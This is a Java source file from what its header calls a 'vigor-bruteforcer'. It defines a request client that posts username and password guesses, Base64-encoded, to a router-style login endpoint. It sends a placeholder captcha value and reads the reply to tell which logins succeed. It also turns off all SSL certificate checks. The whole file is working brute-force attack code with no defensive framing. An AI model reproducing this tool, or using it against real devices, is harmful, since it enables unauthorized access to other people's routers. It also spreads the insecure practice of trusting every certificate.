package D4N3;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import java.util.Properties;

/**
 * 24-11-17
 * vigor-bruteforcer created by Dane Naebers
 */

public class RequestClient {
    private Properties config;
    private URL url;
    private HttpURLConnection con;

    public RequestClient(String configPath) throws IOException {
        loadPropertyFile(configPath);
        configureRequestClient();
    }

    private void loadPropertyFile(String configPath) {
        try (FileInputStream is = new FileInputStream(configPath)) {
            config = new Properties();
            config.load(is);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void configureRequestClient() throws IOException {
        HttpsTrustManager.allowAllSSL();
        url = new URL(config.getProperty("requestUrl"));
        con = (HttpURLConnection) url.openConnection();
        con.setRequestProperty("Content-Type", "text/plain; charset=utf-8");
        con.setRequestMethod("POST");
        con.setDoOutput(true);
        con.setDoInput(true);
    }

    private String encodeParam(String param) {
        return Base64.getEncoder().encodeToString(param.getBytes());
    }

    public boolean makeRequest(String username, String password) throws IOException {
        OutputStream os = con.getOutputStream();
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("action=login&formusername=");
        stringBuilder.append(encodeParam(username));
        stringBuilder.append("&formpassword=");
        stringBuilder.append(encodeParam(password));
        stringBuilder.append("&formcaptcha=bnVsbA==&rtick=null");
        os.write(stringBuilder.toString().getBytes("UTF-8"));
        os.close();

        StringBuilder response = new StringBuilder();
        BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream(), "utf-8"));
        String line = null;
        while ((line = br.readLine()) != null) {
            response.append(line);
        }
        br.close();
        if(response.toString().toLowerCase().equals("nil")) {
            return false;
        } else {
            return true;
        }
    }

}
